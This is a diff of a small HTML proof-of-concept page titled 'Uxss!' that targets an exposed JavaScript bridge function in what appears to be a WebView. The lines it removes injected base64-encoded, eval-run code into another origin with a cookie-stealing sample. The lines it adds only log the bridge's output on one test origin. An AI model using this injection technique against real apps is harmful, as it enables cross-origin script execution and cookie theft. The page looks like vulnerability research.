@@ -1,23 +1,15 @@
 <h1>Uxss!</h1>
 <script>
-  function triggerPoc(url,code){
-    const currUrl = location.href;
-    const payload = `
-      if(!window.__cloudx && !location.href.startsWith("${currUrl}")){
-          window.__cloudx = true;
-          ${code}
-        }`;
-    const base64 = btoa(payload);
+  function triggerPoc(url){
     for(let i=0; i<1000; i++){
       setTimeout(function(){
-      if(window.testJsProxy && typeof window.testJsProxy.danger === "function"){
-        window.testJsProxy.danger(`eval(atob("${base64}"))`);
-        
+      if(window.testJsProxy && typeof window.testJsProxy.danger === "function" && location.href.startsWith("https://renfromabove.github.io")){
+        console.log(location.href+" get the api "+ window.testJsProxy.danger());
       }},i)
     }
     location.href = url;
   }
   window.addEventListener('load', () => {
-    triggerPoc("https://www.baidu.com",`console.log('cloudx steal cookie:'+document.cookie)`)
+    triggerPoc("https://www.baidu.com")
   })
 </script>
